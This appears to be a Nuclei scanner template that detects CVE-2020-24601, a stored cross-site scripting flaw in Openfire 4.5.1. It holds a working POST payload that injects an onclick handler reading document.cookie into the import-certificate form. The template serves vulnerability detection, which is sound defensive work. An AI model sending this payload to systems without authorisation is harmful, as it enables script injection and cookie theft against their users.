id: CVE-2020-24601

info:
  name: Stored XSS in Ignite Realtime Openfire 4.5.1
  author: ProjectDiscoveryAI
  severity: medium
  description: Stored Cross-site Scripting Vulnerability in Ignite Realtime Openfire 4.5.1 allows execution of arbitrary JavaScript via POST parameter.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of a victim's browser, leading to account takeover, data theft, or other attacks.
  remediation: |
    Upgrade Openfire to version 4.5.2 or later to mitigate the stored XSS vulnerability (CVE-2020-24601).

http:
  - method: POST
    path:
      - "{{BaseURL}}/import-certificate"

    body: |
      searchName=test&alias='+accesskey='X'+onclick='alert(document.cookie)

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "+accesskey='X'+onclick='alert(document.cookie)"
        part: body
